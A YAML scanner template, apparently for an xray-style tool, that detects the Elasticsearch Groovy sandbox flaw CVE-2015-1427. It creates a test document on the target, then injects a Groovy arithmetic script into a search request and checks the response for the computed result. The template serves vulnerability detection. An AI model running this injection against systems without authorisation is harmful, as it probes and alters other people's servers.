name: yaml-poc-elastic-elasticsearch-unauthorized_access-CVE-2015-1427
binding: 1c0625d1-ebff-4e45-880f-903459b8962b
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/130368/Elasticsearch-1.3.7-1.4.2-Sandbox-Escape-Command-Execution.html
        - http://packetstormsecurity.com/files/130784/ElasticSearch-Unauthenticated-Remote-Code-Execution.html
        - http://www.elasticsearch.com/blog/elasticsearch-1-4-3-1-3-8-released/
        - http://www.securityfocus.com/archive/1/534689/100/0/threaded
        - http://www.securityfocus.com/archive/1/archive/1/534689/100/0/threaded
        - http://www.securityfocus.com/bid/72585
        - http://www.securityfocus.com/bid/72585/info
        - http://xforce.iss.net/xforce/xfdb/100850
        - https://access.redhat.com/errata/RHSA-2017:0868
        - https://exchange.xforce.ibmcloud.com/vulnerabilities/100850
        - https://www.elastic.co/community/security/
    vulnerability:
        id: 107fcfb5-1d72-41e3-b6cb-d86d9e3295a4
        level: medium
transport: http
set:
    r1: randomInt(40000, 44800)
    r2: randomInt(40000, 44800)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /test/test
            headers:
                Content-Type: application/json
            body: |
                {
                  "name": "test"
                }
        expression: response.status == 201
    r1:
        request:
            cache: true
            method: POST
            path: /_search
            headers:
                Content-Type: application/json
            body: |
                {
                    "size":1,
                    "script_fields":{
                        "lupin":{
                            "lang":"groovy",
                            "script":"{{r1}}*{{r2}}"
                        }
                    }
                }
        expression: response.status == 200 && response.content_type.icontains("json") && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0() && r1()
